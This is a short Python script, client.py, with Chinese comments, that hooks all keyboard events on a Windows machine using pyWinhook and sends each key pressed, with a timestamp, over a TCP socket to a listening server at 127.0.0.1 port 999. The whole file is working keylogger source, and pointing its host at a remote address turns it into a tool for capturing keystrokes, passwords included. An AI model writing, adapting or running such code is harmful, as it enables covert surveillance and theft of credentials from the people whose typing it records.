# client.py
import socket
import pythoncom
import pyWinhook  # 基于Python的“钩子”库，主要用于监听当前电脑上鼠标和键盘的事件。
import time

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "127.0.0.1"
port = 999
client.connect((host, port))


def onKeyboardEvent(event):
    # 监听键盘事件
    client.send(("\nKey:" + event.Key).encode())
    client.send(("Time:" + time.strftime("%Y %H:%M:%S", time.localtime())).encode())
    client.send("\n------------".encode())
    return True


def main():
    # 创建一个“钩子”管理对象
    hm = pyWinhook.HookManager()
    # 监听所有键盘事件
    hm.KeyDown = onKeyboardEvent
    # 设置键盘“钩子”
    hm.HookKeyboard()
    # 进入循环，如不手动关闭，程序将一直处于监听状态
    pythoncom.PumpMessages()
    client.close()


if __name__ == "__main__":
    main()
